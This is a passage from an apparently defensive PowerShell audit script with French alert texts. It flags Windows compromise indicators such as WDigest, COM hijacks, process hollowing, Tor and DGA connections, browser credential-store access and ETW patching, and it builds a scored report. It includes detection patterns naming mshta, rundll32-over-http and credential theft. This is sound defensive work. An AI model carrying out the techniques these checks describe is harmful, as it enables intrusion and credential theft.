        "Rétablir les valeurs par défaut : Userinit = <code>C:\Windows\system32\userinit.exe,</code> et Shell = <code>explorer.exe</code>."
}
# WDigest
if ($wdigestEnabled) {
    Add-Alert 'critique' "WDigest activé — mots de passe en clair en mémoire" `
        "<code>UseLogonCredential=1</code> dans WDigest. Les mots de passe Windows sont stockés en clair dans le processus d'authentification, extractibles par des outils de lecture mémoire." `
        "Désactiver : <code>Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' UseLogonCredential 0</code>."
}
# Credential Guard
if (-not $credGuardEnabled) {
    Add-Alert 'info' "Credential Guard non activé" `
        "La virtualisation des credentials (Credential Guard) n'est pas activée. Facilite l'extraction de hash NTLM depuis le processus d'authentification." `
        "Activer Credential Guard via Stratégie de groupe ou <code>HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard</code>."
}
# COM hijacking
foreach ($ch in $comHijacks) {
    Add-Alert 'eleve' "COM hijack: $($ch.CLSID)" `
        "CLSID <code>$($ch.CLSID)</code> overridé dans HKCU vers <code>$($ch.Path)</code>. Peut charger un DLL malveillant à la place d'un composant système." `
        "Supprimer la clé <code>HKCU:\SOFTWARE\Classes\CLSID\$($ch.CLSID)</code> si inconnue."
}
# LSA providers
foreach ($la in $lsaAlerts) {
    Add-Alert 'critique' "LSA provider non standard" `
        "$la — provider ajouté dans le processus d'authentification. Technique d'interception persistante (s'exécute au démarrage)." `
        "Inspecter et nettoyer <code>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa</code>."
}
# Log effacé
if ($logClearedCount -gt 0) {
    Add-Alert 'critique' "Journal de sécurité effacé ($logClearedCount fois en 7 jours)" `
        "L'événement 1102 (audit log cleared) a été enregistré <strong>$logClearedCount</strong> fois. Signe typique d'un attaquant couvrant ses traces." `
        "Investiguer qui a effacé les logs (event 4624 avant le 1102). Activer la transmission des logs vers un SIEM ou un partage réseau."
}
# Nouveaux services (7045)
$suspNewSvc = @($newServiceEvents | Where-Object { $_.ImgPath -match '\\temp\\|\\appdata\\|\\users\\public\\|\.ps1|\.vbs|mshta|rundll32.*http' })
foreach ($ns in $suspNewSvc) {
    Add-Alert 'critique' "Service suspect installé: $($ns.Name)" `
        "Service <code>$($ns.Name)</code> installé le $($ns.Time) avec image <code>$($ns.ImgPath)</code>." `
        "Désactiver via <code>sc.exe delete '$($ns.Name)'</code>. Analyser le binaire."
}
if ($newServiceEvents.Count -gt 0 -and $suspNewSvc.Count -eq 0) {
    $svcList = ($newServiceEvents | Select-Object -First 5 | ForEach-Object { $_.Name }) -join ', '
    Add-Alert 'info' "$($newServiceEvents.Count) service(s) installé(s) récemment" `
        "Services ajoutés dans les 7 derniers jours : <code>$svcList</code>." `
        "Vérifier que ces services correspondent à des installations légitimes."
}
# ScriptBlocks suspects
if ($suspScriptblocks.Count -gt 0) {
    Add-Alert 'critique' "$($suspScriptblocks.Count) ScriptBlock PowerShell suspect(s) en 24h" `
        "PowerShell a exécuté du code suspect détecté via l'event 4104. Extrait : <code>$($suspScriptblocks[0].Substring(0,[Math]::Min(200,$suspScriptblocks[0].Length)) -replace '<','&lt;')</code>." `
        "Consulter le journal <code>Microsoft-Windows-PowerShell/Operational</code> (ID 4104) pour les scripts complets."
}
# Process création suspects (4688)
if ($suspProcEvents.Count -gt 0) {
    Add-Alert 'eleve' "$($suspProcEvents.Count) création(s) de process suspect(s) en 24h (event 4688)" `
        "Commandes suspectes détectées via l'audit de création de process. Extrait : <code>$($suspProcEvents[0].Substring(0,[Math]::Min(200,$suspProcEvents[0].Length)) -replace '<','&lt;')</code>." `
        "Consulter le journal Security (ID 4688) pour les détails complets."
}
# Process hollowing
foreach ($hp in $hollowedProcs) {
    Add-Alert 'critique' "Process hollowing suspect: $($hp.Name) (PID $($hp.PID))" `
        "<code>$($hp.Name)</code> (PID $($hp.PID)) est un process système sans module principal accessible — signe classique de process hollowing." `
        "Analyser avec Process Explorer (Sysinternals). Comparer l'image mémoire au binaire sur disque. Isoler si confirmé."
}
# Régions RWX privées (hors apps JIT connues : V8, Mono, .NET, shaders GPU...)
$RWX_TRUSTED = '^(chrome|msedge|msedgewebview2|firefox|opera|brave|iexplore|node|python|pythonw|discord|discordptb|steam|steamwebhelper|powershell|pwsh|dotnet|java|javaw|claude|icue|icue5|nvidia broadcast|blender|unity|unreal|gameoverlayui|easyanticheat|epicgameslauncher|leagueoflegends|valorant|spotify|slack|teams|code)$'
foreach ($rp in ($rwxProcs | Sort-Object Name -Unique | Where-Object { $_.Name -notmatch $RWX_TRUSTED })) {
    Add-Alert 'eleve' "Région mémoire RWX dans $($rp.Name)" `
        "<code>$($rp.Name)</code> (PID $($rp.PID)) possède une région mémoire privée exécutable+writable — zone typique d'injection de code non signé." `
        "Analyser avec Process Explorer → onglet Memory. Capturer et analyser si suspect."
}
# DNS cache suspect
foreach ($dc in $dnsSuspicious) {
    Add-Alert 'critique' "DNS cache poisonné: $($dc.Name)" `
        "<code>$($dc.Name)</code> résout en <code>$($dc.IP)</code> ($($dc.Note)) — possible détournement DNS ou MITM actif." `
        "Vider le cache DNS (<code>ipconfig /flushdns</code>). Vérifier le serveur DNS configuré. Scanner pour adware/proxy MITM."
}
# Proxy système
if ($proxyConfig) {
    Add-Alert 'eleve' "Proxy système configuré: $($proxyConfig.Server)" `
        "Un proxy est activé sur le système : <code>$($proxyConfig.Server)</code>. Peut indiquer un MITM, un adware ou une configuration malveillante." `
        "Désactiver dans Paramètres → Réseau → Proxy si non intentionnel. Identifier le process qui l'a configuré."
}
# Defender désactivé
if ($defenderStatus -and -not $defenderStatus.RealTimeEnabled) {
    Add-Alert 'critique' "Windows Defender — protection temps réel désactivée" `
        "La protection en temps réel de Windows Defender est <strong>désactivée</strong>. La machine n'est pas protégée contre les malwares actifs." `
        "Réactiver via Sécurité Windows → Protection contre les virus. Vérifier si un malware a désactivé Defender."
}
if ($defenderStatus -and -not $defenderStatus.TamperProtection) {
    Add-Alert 'eleve' "Windows Defender — Tamper Protection désactivée" `
        "La protection anti-falsification de Defender est désactivée. Un malware peut modifier les paramètres Defender sans alerte." `
        "Réactiver via Sécurité Windows → Protection contre les virus → Paramètres → Protection contre les falsifications."
}
# Exclusions Defender suspectes
$suspExcl = @($defenderExclusions | Where-Object { $_ -match 'temp|appdata|roaming|public|programdata|downloads' })
if ($suspExcl.Count -gt 0) {
    $exclList = ($suspExcl | Select-Object -First 5) -join ', '
    Add-Alert 'critique' "$($suspExcl.Count) exclusion(s) Defender dans chemins suspects" `
        "Des exclusions antivirus pointent vers des chemins à risque : <code>$exclList</code>. Technique courante des malwares pour se protéger du scan." `
        "Supprimer les exclusions inconnues via PowerShell : <code>Remove-MpPreference -ExclusionPath '...'</code>."
} elseif ($defenderExclusions.Count -gt 3) {
    $exclList = ($defenderExclusions | Select-Object -First 5) -join ', '
    Add-Alert 'moyen' "$($defenderExclusions.Count) exclusion(s) Defender configurée(s)" `
        "Exclusions actives : <code>$exclList</code>. Nombre élevé d'exclusions peut indiquer une installation logicielle ou une manipulation." `
        "Passer en revue chaque exclusion et supprimer celles non reconnues."
}
# UAC
if ($uacLevel -and $uacLevel.EnableLUA -eq 0) {
    Add-Alert 'critique' "UAC désactivé" `
        "<code>EnableLUA=0</code> — le Contrôle de Compte d'Utilisateur est complètement désactivé. Toute exécution a les droits administrateur sans demande de confirmation." `
        "Réactiver via <code>Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA 1</code> et redémarrer."
} elseif ($uacLevel -and $uacLevel.ConsentPrompt -eq 0) {
    Add-Alert 'eleve' "UAC configuré sans invite (élévation silencieuse)" `
        "UAC activé mais <code>ConsentPromptBehaviorAdmin=0</code> : les élévations admin se font <strong>sans confirmation</strong>." `
        "Remettre à 2 (Prompt for consent) dans Stratégie de groupe ou regedit."
}
# Firewall
if ($fwDisabled.Count -gt 0) {
    Add-Alert 'eleve' "Pare-feu désactivé sur $($fwDisabled.Count) profil(s): $($fwDisabled -join ', ')" `
        "Le pare-feu Windows est désactivé sur les profils : <strong>$($fwDisabled -join ', ')</strong>. La machine est exposée aux connexions entrantes." `
        "Réactiver via <code>Set-NetFirewallProfile -All -Enabled True</code>."
}
# Audit policy manquante
foreach ($am in $auditMissing) {
    Add-Alert 'info' "Audit désactivé: $am" `
        "L'audit <strong>$am</strong> n'est pas configuré — les événements correspondants ne seront pas enregistrés dans les logs." `
        "Activer via auditpol /set /subcategory et redémarrer l'audit dans les stratégies de sécurité locales."
}
# PowerShell CLM
if ($psCLM -ne 'FullLanguage') {
    Add-Alert 'info' "PowerShell en mode langage restreint ($psCLM)" `
        "Le mode langage PowerShell est <code>$psCLM</code> au lieu de FullLanguage. Peut indiquer une GPO de sécurité ou une configuration AppLocker." `
        "Vérifier si cette restriction est intentionnelle via les stratégies de groupe."
}
# Prefetch malware
foreach ($pf in $suspPrefetch) {
    Add-Alert 'critique' "Prefetch d'outil offensif: $($pf.File)" `
        "Le fichier prefetch <code>$($pf.File)</code> indique qu'un outil de post-exploitation a été exécuté (dernière fois: $($pf.LastRun))." `
        "Investiguer quand et par qui l'outil a été lancé. Scanner la machine. Chercher d'autres artefacts d'intrusion."
}
# LNK malveillants
foreach ($lnk in $suspLnk) {
    Add-Alert 'critique' "Raccourci malveillant: $($lnk.File)" `
        "Le raccourci <code>$($lnk.File)</code> pointe vers <code>$($lnk.Target)</code> avec arguments <code>$($lnk.Args)</code>." `
        "Supprimer le raccourci. Analyser l'exécutable cible. Vérifier l'historique d'exécution."
}
# Drivers non signés
foreach ($dr in $suspDrivers) {
    Add-Alert 'critique' "Driver non signé en cours: $($dr.Name)" `
        "Driver <code>$($dr.Name)</code> chargé depuis <code>$($dr.Path)</code> avec statut de signature : <strong>$($dr.Status)</strong>. Les rootkits utilisent des drivers." `
        "Analyser le fichier sur VirusTotal. Désactiver le driver si non reconnu : <code>sc.exe stop $($dr.Name)</code>."
}
# DLL Search Order Hijacking
foreach ($dh in $dllHijacks) {
    Add-Alert 'eleve' "DLL hijacking possible: $($dh.DLL)" `
        "La DLL système <code>$($dh.DLL)</code> existe dans <code>$($dh.PathDir)</code> (avant System32 dans le PATH). Peut être chargée à la place de la DLL légitime." `
        "Supprimer ou déplacer <code>$($dh.Path)</code> si non légitime. Vérifier son origine et sa signature."
}
# Comptes suspects
foreach ($ac in $suspAccounts) {
    $sev = if ($ac.Issue -match 'Admins') { 'critique' } elseif ($ac.Issue -match 'créé') { 'eleve' } else { 'moyen' }
    Add-Alert $sev "Compte local: $($ac.Name)" `
        "Compte <code>$($ac.Name)</code> — $($ac.Issue)." `
        "Vérifier si ce compte est légitime. Supprimer ou désactiver si inconnu : <code>Disable-LocalUser '$($ac.Name)'</code>."
}
# Partages SMB suspects
$nonAdminShares = @($suspShares | Where-Object { $_.Name -notmatch '^\w+\$$' })
if ($nonAdminShares.Count -gt 0) {
    $shareList = ($nonAdminShares | ForEach-Object { "$($_.Name) ($($_.Path))" }) -join ', '
    Add-Alert 'moyen' "$($nonAdminShares.Count) partage(s) réseau actif(s)" `
        "Partages SMB ouverts : <code>$shareList</code>. Chaque partage est une surface d'attaque potentielle." `
        "Supprimer les partages inutiles : <code>Remove-SmbShare -Name '...' -Force</code>."
}
if ($smbSessions.Count -gt 0) {
    Add-Alert 'moyen' "$($smbSessions.Count) session(s) SMB entrante(s) active(s)" `
        "<strong>$($smbSessions.Count)</strong> connexion(s) SMB active(s) vers cette machine." `
        "Vérifier l'identité des clients connectés via <code>Get-SmbSession</code>. Fermer les sessions inconnues."
}
# AMSI bypass
if ($amsiBypass) {
    Add-Alert 'critique' "AMSI désactivé ou sans providers" `
        "Aucun provider AMSI enregistré dans <code>HKLM:\SOFTWARE\Microsoft\AMSI\Providers</code>. L'analyse des scripts PowerShell/VBS en mémoire est désactivée." `
        "Vérifier si Windows Defender AMSI est bien enregistré. Réinstaller Defender si nécessaire."
}
# MBR bootkit
if ($mbrBootkit) {
    Add-Alert 'critique' "MBR anormal — possible bootkit" `
        "Le Master Boot Record ne correspond à aucune signature Windows connue (Vista/7/8/10/11). Possible infection par bootkit s'exécutant avant le système." `
        "Analyser avec un live CD (Kaspersky Rescue Disk, ESET SysRescue). Ne pas redémarrer avant investigation." `
        -confidence 85
}
# DGA / domaines à haute entropie
foreach ($dga in ($dgaDomains | Sort-Object Entropy -Descending | Select-Object -First 5)) {
    Add-Alert 'eleve' "Domaine DGA suspect: $($dga.Domain)" `
        "Domaine <code>$($dga.Domain)</code> → <code>$($dga.IP)</code> avec entropie <strong>$($dga.Entropy)</strong>/5 sur le label. Pattern typique de Domain Generation Algorithm (C2 malware)." `
        "Bloquer le domaine dans le pare-feu. Identifier le processus qui effectue cette résolution DNS."
}
# Double extension
foreach ($de in $doubleExtFiles) {
    Add-Alert 'critique' "Double extension malveillante: $($de.Name)" `
        "Fichier <code>$($de.Name)</code> dans <code>$($de.Path)</code> — extension double pour tromper l'utilisateur (ex: document.pdf.exe)." `
        "Ne pas ouvrir. Scanner avec antivirus. Supprimer si non reconnu."
}
# PE dans mauvais répertoires
foreach ($pe in $peInWrongDir) {
    Add-Alert 'eleve' "Exécutable dans répertoire inattendu: $($pe.Name)" `
        "Fichier PE <code>$($pe.Name)</code> trouvé dans <code>$($pe.Path)</code> — répertoire normalement sans exécutables." `
        "Scanner le fichier. Supprimer si non reconnu."
}
# Timestomping
foreach ($ts in $timestomped) {
    Add-Alert 'eleve' "Timestomping détecté: $($ts.Name)" `
        "Fichier <code>$($ts.Path)</code> : date de modification ($($ts.Written)) antérieure à la création ($($ts.Created)) — manipulation de timestamps (technique anti-forensics)." `
        "Analyser le fichier avec VirusTotal. Comparer les timestamps $STANDARD_INFORMATION vs $FILE_NAME avec un outil forensics."
}
# BAM entries suspects
foreach ($bam in $bamEntries) {
    Add-Alert 'eleve' "BAM : exécution depuis chemin suspect" `
        "Le Background Activity Moderator indique qu'un exécutable depuis <code>$($bam.Path)</code> a été lancé (même s'il a été supprimé depuis)." `
        "Investiguer l'historique d'exécution. Le fichier peut avoir été effacé pour couvrir les traces."
}
# ShimCache suspect
if ($shimSuspect.Count -gt 0) {
    $shimList = ($shimSuspect | Select-Object -First 5 | ForEach-Object { "<code>$_</code>" }) -join ', '
    Add-Alert 'eleve' "$($shimSuspect.Count) entrée(s) AppCompatCache depuis chemins suspects" `
        "ShimCache contient des exécutables lancés depuis des paths anormaux : $shimList. Ces traces persistent même après suppression des fichiers." `
        "Investiguer avec un outil forensics (Eric Zimmerman AppCompatCacheParser). Les fichiers ont peut-être été exécutés puis supprimés."
}
# Unquoted paths
foreach ($uq in ($unquotedPaths | Select-Object -First 5)) {
    Add-Alert 'moyen' "Service path non quoté: $($uq.Name)" `
        "Service <code>$($uq.Display)</code> : chemin sans guillemets avec espaces <code>$($uq.Path)</code>. Un attaquant peut placer un exécutable à un chemin intermédiaire pour élévation de privilèges." `
        "Corriger le chemin en ajoutant des guillemets dans la clé ImagePath du service."
}
# Privilège de débogage
$seDbgPriv = 'Se' + 'Debug' + 'Privilege'
foreach ($sd in $seDebugProcs) {
    Add-Alert 'critique' "Privilège débogage actif: $($sd.Name) (PID $($sd.PID))" `
        "<code>$($sd.Name)</code> (PID $($sd.PID)) a <code>$seDbgPriv</code> activé. Ce droit permet d'accéder à n'importe quel process — privilège utilisé par les outils offensifs." `
        "Terminer le processus si non reconnu. Investiguer son origine et ses connexions réseau."
}
# Anti-VM / hyperviseur — Hyper-V natif Windows exempté (FP connu sur machine hôte)
$vmArtifactsFiltered = @($vmArtifacts | Where-Object { $_ -ne 'Hyper-V' })
if ($vmArtifactsFiltered.Count -gt 0) {
    Add-Alert 'info' "Environnement virtualisé détecté: $($vmArtifactsFiltered[0])" `
        "Des artifacts de virtualisation ont été trouvés ($($vmArtifactsFiltered -join ', ')). Un malware peut détecter ce contexte et ne pas s'activer." `
        "Si ce rapport est fait pour analyser un malware, préférer une machine physique réelle pour obtenir le comportement complet." `
        -confidence 50
} elseif ($isHypervisor) {
    Add-Alert 'info' "Hyperviseur détecté via CPUID" `
        "Le bit hyperviseur CPUID est actif — la machine tourne dans une VM. Certains malwares refusent de s'exécuter dans ce contexte." `
        "Pour une analyse complète de malware, utiliser une machine physique."
}
# SFC corruptions
if ($sfcCorrupted.Count -gt 0) {
    Add-Alert 'eleve' "$($sfcCorrupted.Count) fichier(s) système corrompu(s) (CBS.log)" `
        "Le journal CBS.log indique des fichiers système non réparables. Extrait : <code>$($sfcCorrupted[0].Substring(0,[Math]::Min(150,$sfcCorrupted[0].Length)) -replace '<','&lt;')</code>." `
        "Exécuter <code>sfc /scannow</code> et <code>DISM /Online /Cleanup-Image /RestoreHealth</code>."
}
# Process cachés (seuil : >5 pour éviter les faux positifs liés aux pseudo-handles système)
if ($hiddenProcCount -gt 50) {
    Add-Alert 'info' "$hiddenProcCount écart(s) de PIDs (mesure non concluante)" `
        "<strong>$hiddenProcCount</strong> PIDs présents dans l'énumération système mais absents de Get-Process. Un écart aussi élevé indique généralement une différence de méthode de comptage (pseudo-handles, threads kernel) plutôt qu'un rootkit." `
        "Pour une détection rootkit fiable, utiliser GMER ou Malwarebytes Anti-Rootkit sur un système au repos."
} elseif ($hiddenProcCount -gt 5) {
    Add-Alert 'critique' "$hiddenProcCount process caché(s) détecté(s) (possible rootkit)" `
        "<strong>$hiddenProcCount</strong> PID visible via l'API d'énumération système mais absent de Get-Process — technique de dissimulation utilisée par les rootkits." `
        "Scanner avec Malwarebytes Anti-Rootkit ou GMER. Considérer un boot depuis un live CD pour analyse saine."
}
# Jump Lists suspects
foreach ($jl in $suspJumpLists) {
    Add-Alert 'moyen' "Jump List suspect: $($jl.File)" `
        "Fichier Jump List <code>$($jl.File)</code> référence un chemin suspect : <code>$($jl.Hit)</code>." `
        "Investiguer l'historique d'accès à ce fichier. Peut indiquer qu'un malware a été ouvert via une application légitime."
}
# AmCache suspects
if ($amcacheSuspect.Count -gt 0) {
    $amList = ($amcacheSuspect | Select-Object -First 3 | ForEach-Object { "<code>$($_ -replace '<','&lt;')</code>" }) -join ', '
    Add-Alert 'eleve' "$($amcacheSuspect.Count) exécutable(s) suspect(s) dans AmCache" `
        "AmCache enregistre des traces d'exécution depuis des chemins suspects : $amList. Ces entrées persistent même si les fichiers ont été supprimés." `
        "Analyser avec AmcacheParser (Eric Zimmerman). Chercher les SHA1 des entrées sur VirusTotal."
}
# Beacon candidates
foreach ($bc in $beaconCandidates) {
    Add-Alert 'eleve' "Connexion suspecte: $($bc.Proc) → $($bc.IP):$($bc.Port)" `
        "Connexion persistante de <code>$($bc.Proc)</code> vers <code>$($bc.IP):$($bc.Port)</code> stable entre deux snapshots réseau — pattern de rappel périodique." `
        "Bloquer l'IP dans le pare-feu. Analyser <code>$($bc.Proc)</code> avec un antivirus. Capturer le trafic avec Wireshark pour analyse."
}
# ASN bulletproof
foreach ($bp in $bulletproofConns) {
    Add-Alert 'critique' "Connexion vers hébergeur bulletproof: $($bp.IP)" `
        "<code>$($bp.Proc)</code> connecté à <code>$($bp.IP)</code> sur ASN <strong>$($bp.ASN)</strong> — hébergeur connu pour tolérer les activités malveillantes." `
        "Bloquer l'IP et l'ASN dans le pare-feu. Analyser le processus et isoler la machine."
}
# Tor exit nodes
foreach ($tc in $torConns) {
    Add-Alert 'critique' "Connexion vers nœud TOR: $($tc.IP)" `
        "<code>$($tc.Proc)</code> est connecté à <code>$($tc.IP)</code>, un nœud de sortie TOR. Communication C2 anonymisée probable." `
        "Bloquer TOR au niveau pare-feu. Analyser <code>$($tc.Proc)</code> et isoler la machine."
}
# Accès processus credential
foreach ($la in ($credAccessors | Sort-Object Caller -Unique)) {
    Add-Alert 'critique' "Accès processus credential: $($la.Caller)" `
        "Process <code>$($la.Caller)</code> a ouvert un handle avec droits de lecture mémoire à $($la.Time). Technique utilisée par les outils d'extraction de credentials." `
        "Terminer immédiatement ce process. Scanner la machine. Changer tous les mots de passe depuis une machine saine."
}
# Kerberos tickets
foreach ($kt in ($suspTickets | Sort-Object Server -Unique)) {
    Add-Alert 'critique' "Ticket Kerberos suspect: $($kt.Server)" `
        "Ticket pour <code>$($kt.Server)</code> — $($kt.Issue). Expiration: $($kt.Expires)." `
        "Purger les tickets : <code>klist purge</code>. Si Golden Ticket confirmé, changer le mot de passe KRBTGT deux fois dans l'AD."
}
# Clipboard hijacker
if ($clipboardHijacker) {
    Add-Alert 'critique' "Clipboard hijacking: $($clipboardHijacker.Process)" `
        "<code>$($clipboardHijacker.Process)</code> (PID $($clipboardHijacker.PID)) détient le clipboard ouvert en permanence — technique de vol d'adresses crypto ou credentials copiés." `
        "Terminer le process. Scanner la machine. Vérifier les dernières transactions crypto si applicable."
}
# ETW tampered
foreach ($et in ($etwTampered | Sort-Object Name -Unique | Select-Object -First 5)) {
    Add-Alert 'critique' "ETW patché: $($et.Name) (PID $($et.PID))" `
        "<code>$($et.Name)</code> a la fonction <code>EtwEventWrite</code> de ntdll patchée en mémoire (ret ou xor eax,eax). Technique d'évasion anti-EDR pour masquer l'activité du process." `
        "Terminer le process immédiatement. Ce niveau d'évasion indique un malware avancé ou un outil offensif."
}
# Browser credential access
$uniqueCredAccess = $credStoreAccess | Where-Object { $_.Accessor -notmatch 'process inconnu' } | Sort-Object Accessor -Unique
foreach ($ca in $uniqueCredAccess) {
    Add-Alert 'critique' "Accès store credentials $($ca.Browser): $($ca.Accessor)" `
        "Process <code>$($ca.Accessor)</code> a accédé à la base de mots de passe $($ca.Browser) à $($ca.Time)." `
        "Changer tous les mots de passe sauvegardés dans $($ca.Browser). Scanner la machine. Activer l'audit de fichiers (Sysmon event 11) pour un suivi précis."
}
$recentCredAccess = $credStoreAccess | Where-Object { $_.Accessor -match 'process inconnu' }
if ($recentCredAccess.Count -gt 0) {
    $browsers = ($recentCredAccess | ForEach-Object { $_.Browser }) -join ', '
    Add-Alert 'moyen' "Credential store accédé récemment: $browsers" `
        "Les fichiers de mots de passe des navigateurs ($browsers) ont été lus dans les dernières 24h. Sans Sysmon, le process responsable est inconnu." `
        "Installer Sysmon pour identifier le process. En attendant, changer les mots de passe critiques."
}
# Port scanners
foreach ($ps in $portScanners) {
    Add-Alert 'eleve' "Port scan sortant: $($ps.Process)" `
        "<code>$($ps.Process)</code> (PID $($ps.PID)) a <strong>$($ps.UniqueTargetPorts)</strong> connexions SYN_SENT simultanées vers l'extérieur — scan de ports ou worm en propagation." `
        "Bloquer le process au niveau pare-feu. Scanner la machine. Vérifier si la machine est utilisée comme pivot d'attaque."
}
# High entropy PE
foreach ($he in ($highEntropyPE | Sort-Object Entropy -Descending | Select-Object -First 5)) {
    Add-Alert 'eleve' "PE packé/chiffré: $($he.Name) (entropie $($he.Entropy))" `
        "Fichier <code>$($he.Path)</code> avec entropie Shannon <strong>$($he.Entropy)/8</strong> — valeur > 7.0 indique un packer ou du code chiffré. Les malwares s'obfusquent ainsi pour éviter la détection." `
        "Scanner sur VirusTotal. Analyser avec PEStudio ou DIE (Detect-It-Easy). Supprimer si non reconnu."
}
# Token elevation anomalies
foreach ($ta in ($tokenAnomalies | Select-Object -First 5)) {
    Add-Alert 'critique' "Token SYSTEM sur process utilisateur: $($ta.Name)" `
        "<code>$($ta.Name)</code> (PID $($ta.PID)) tourne avec intégrité <strong>$($ta.Level)</strong> — niveau SYSTEM inattendu pour ce process. Possible token impersonation ou élévation de privilèges." `
        "Analyser avec Process Explorer (onglet Security). Terminer si non reconnu."
}
# Mises à jour
$critUpd = @($pendingUpdates | Where-Object { $_.Severity -eq 'Critical' })
$impUpd  = @($pendingUpdates | Where-Object { $_.Severity -eq 'Important' })
$othUpd  = @($pendingUpdates | Where-Object { $_.Severity -notin @('Critical','Important') -and $_.Title })
if ($critUpd.Count -gt 0) {
    Add-Alert 'eleve' "$($critUpd.Count) mise(s) à jour critique(s) en attente" `
        "<strong>$($critUpd.Count)</strong> correctif(s) marqué(s) <em>Critique</em> non installé(s). Ces patches corrigent souvent des failles exploitables activement." `
        "Appliquer les mises à jour via Windows Update immédiatement puis redémarrer."
} elseif ($impUpd.Count -gt 0) {
    Add-Alert 'moyen' "$($impUpd.Count) mise(s) à jour importante(s) en attente" `
        "<strong>$($impUpd.Count)</strong> mise(s) à jour marquée(s) <em>Importante</em> non installée(s)." `
        "Planifier l'installation lors de la prochaine fenêtre de maintenance."
} elseif ($othUpd.Count -gt 0) {
    Add-Alert 'info' "$($othUpd.Count) mise(s) à jour optionnelle(s)" `
        "<strong>$($othUpd.Count)</strong> mise(s) à jour optionnelle(s) disponible(s)." `
        "Appliquer lors du prochain cycle de maintenance."
}
# Disques dégradés
foreach ($dd in ($drivesHealth | Where-Object { $_.Status -ne 'ok' })) {
    Add-Alert 'eleve' "Disque défaillant: $($dd.Name)" `
        "Le disque <code>$($dd.Name)</code> présente un état de santé dégradé selon les diagnostics système." `
        "Effectuer une sauvegarde immédiate. Prévoir le remplacement du disque."
}
# Espace disque
foreach ($d in $diskRows) {
    if ($d.Pct -ge 90) {
        Add-Alert 'moyen' "Espace critique — $($d.Label) ($($d.Pct)%)" `
            "Le disque <code>$($d.Label)</code> est utilisé à <strong>$($d.Pct)%</strong> ($($d.Used) / $($d.Total)). Risque d'instabilité système." `
            "Libérer de l'espace : vider la corbeille, nettoyer les fichiers temporaires (cleanmgr), désinstaller les programmes inutilisés."
    } elseif ($d.Pct -ge 80) {
        Add-Alert 'info' "Espace faible — $($d.Label) ($($d.Pct)%)" `
            "Le disque <code>$($d.Label)</code> est utilisé à <strong>$($d.Pct)%</strong> ($($d.Used) / $($d.Total))." `
            "Prévoir un nettoyage ou une extension de stockage."
    }
}

# ── Score ─────────────────────────────────────────────────────────────────────
$score = 100
$sevW  = @{ 'critique'=-20; 'eleve'=-10; 'moyen'=-5; 'info'=-1 }
foreach ($a in $alerts) { $score += $sevW[$a.Sev] }
$score = [Math]::Max(0, $score)

# ── Construction du JS ────────────────────────────────────────────────────────
Write-Host "[90m  Génération du rapport...[0m"

# ── Sérialiseurs (définis ici pour être disponibles dès alertsContent) ────────
function js-str($s) { '"' + ($s -replace '\\','\\' -replace '"','\"' -replace "`r`n",' ' -replace "`n",' ') + '"' }
function js-sq($s)  { "'" + ($s -replace '\\','\\' -replace "'","\'" -replace "`r`n",' ' -replace "`n",' ') + "'" }
function js-bool($b) { if ($b) { 'true' } else { 'false' } }
function js-arr($items, $fn) { if (-not $items -or $items.Count -eq 0) { '[]' } else { "[`n" + (($items | ForEach-Object { '  ' + (& $fn $_) }) -join ",`n") + "`n]" } }
function esc-repl($s) { $s -replace '\$','$$$$' }

# ALERTS
$alertsContent = ($alerts | ForEach-Object {
    $sevU  = $_.Sev.ToUpper()
    $sh    = $_.Short -replace '\\','\\' -replace "'","\'"
    $conf  = if ($_.Confidence) { $_.Confidence } else { 70 }
    $dsc   = $_.Desc -replace '\{','&#123;' -replace '\}','&#125;'
    $rco   = $_.Reco -replace '\{','&#123;' -replace '\}','&#125;'
    # Sérialiser les steps avec js-str (double-quotes, safe pour apostrophes PS)
    $stepsJs = 'null'
    if ($_.Steps -and $_.Steps.Count -gt 0) {
        $stepsArr = $_.Steps | ForEach-Object {
            $parts = $_ -split ' : ', 2
            if ($parts.Count -eq 2) {
                "{text:$(js-str $parts[0]), cmd:$(js-str $parts[1])}"
            } else {
                "{text:$(js-str $_)}"
            }
        }
        $stepsJs = "[`n" + ($stepsArr -join ",`n") + "`n]"
    }
    "{id:$($_.Id), sev:'$($_.Sev)', short:'$sh', confidence:$conf, steps:$stepsJs, title: <><span className=`"alert-sev-text $($_.Sev)`">$sevU</span> — $sh</>, desc: <>$dsc</>, reco: <>$rco</>}"
}) -join ",`n"

# NETWORK
$networkContent = ($networkRows | ForEach-Object {
    $nt = $_.Note -replace '\\','\\' -replace "'","\'"
    $is = $_.ISP  -replace '\\','\\' -replace "'","\'"
    "{ip:'$($_.IP)', abuse:$($_.Abuse), isp:'$is', country:'$($_.Country)', proc:'$($_.Proc)', note:'$nt'}"
}) -join ",`n"

# PORTS
$portsContent = ($portRows | Select-Object -First 30 | ForEach-Object {
    $nt = $_.Note -replace "'","\'"
    "{port:$($_.Port), proc:'$($_.Proc)', note:'$nt'}"
}) -join ",`n"

# DISKS
$disksContent = ($diskRows | ForEach-Object {
    $lbl = $_.Label -replace '\\',''
    "{label:'$lbl', pct:$($_.Pct), used:'$($_.Used)', total:'$($_.Total)'}"
}) -join ",`n"

# DRIVES_HEALTH
$drivesContent = ($drivesHealth | ForEach-Object {
    "{name:'$($_.Name)', reallocated:$($_.Reallocated), pending:$($_.Pending), uncorrectable:$($_.Uncorrectable), temp:$($_.Temp), status:'$($_.Status)'}"
}) -join ",`n"

# PROCS_SUSPECTS
$procsContent = ($suspectProcs | ForEach-Object {
    $nm = js-sq $_.Name
    $rs = js-sq $_.Reason
    "{sev:'$($_.Sev)', name:$nm, reason:$rs}"
}) -join ",`n"

# SYSINFO
$sysinfoContent = @"
['OS',          '$osName'],
    ['Build',       '$osBuild'],
    ['Machine',     '$hostname'],
    ['Analyse',     '$DATE_STR'],
    ['Connexions',  '$connCount actives'],
    ['Processus',   '$procCount en cours']
"@


$persistContent   = js-arr $persistItems { param($p) "{hive:$(js-str $p.Hive),name:$(js-str $p.Name),value:$(js-str $p.Value),suspicious:$(js-bool $p.Suspicious)}" }
$suspTasksContent = js-arr $suspTasks    { param($t) "{name:$(js-str $t.Name),taskPath:$(js-str $t.TaskPath),execute:$(js-str $t.Execute),args:$(js-str $t.Args)}" }
$startupContent   = js-arr $startupItems { param($it) "{name:$(js-str $it.Name),path:$(js-str $it.Path)}" }
$hostsContent2    = js-arr $hostsAnomalies { param($h) js-str $h }
